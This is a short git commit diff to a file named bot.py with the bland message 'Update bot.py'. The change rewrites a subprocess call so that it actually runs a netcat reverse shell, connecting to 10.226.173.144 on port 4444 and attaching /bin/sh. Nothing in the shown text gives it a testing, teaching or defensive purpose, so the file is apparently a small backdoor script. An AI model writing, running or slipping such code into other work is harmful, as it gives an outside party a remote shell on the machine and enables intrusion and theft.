3319fcfebe550477552a76d11bcf9e43cf540eee
sergidinamita <105441185+sergidinamita@users.noreply.github.com>
2023-09-06 19:07:40 +0200

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,10 +1,10 @@
-import subprocess
-
-# Define the command
-command = ["nc 10.226.173.144 4444 -e /bin/sh "]
-
 # Execute the command
 def run():
+    import subprocess
+
+    # Define the command
+    command = ["nc", "10.226.173.144", "4444", "-e", "/bin/sh"]
+
     try:
         subprocess.run(command, check=True)
     except subprocess.CalledProcessError as e:
